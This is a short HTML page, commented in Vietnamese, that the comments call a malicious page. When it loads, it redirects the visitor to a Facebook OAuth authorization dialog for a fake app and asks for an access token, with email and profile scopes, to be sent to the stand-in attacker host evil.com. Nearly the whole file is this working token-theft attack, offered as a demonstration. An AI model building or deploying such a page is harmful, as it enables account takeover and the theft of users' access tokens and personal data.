<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script>
        // Tự động kích hoạt ngay khi trang web độc hại vừa được tải
    window.onload = function() {    
        // Địa chỉ ứng dụng giả mạo do hacker đăng ký trên Facebook Developer Portal
        const clientId = "123456789012345"; 
        
        // Nơi nhận Token (chính là trang web này của hacker)
        const redirectUri = encodeURIComponent("https://evil.com/callback.html"); 
        
        // Danh sách quyền muốn chiếm đoạt
        const scope = "email,public_profile"; 

        // Tạo URL yêu cầu xác thực OAuth của Facebook
        // Sử dụng giao thức web thông thường hoặc deep link "fb://authorize..." tùy thiết bị
        const authUrl = `https://www.facebook.com/v20.0/dialog/oauth?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=token&scope=${scope}`;

        // Ép trình duyệt chuyển hướng ngay lập tức (mất khoảng 0.002 giây)
        window.location.href = authUrl;
    };
    </script>
</body>
</html>
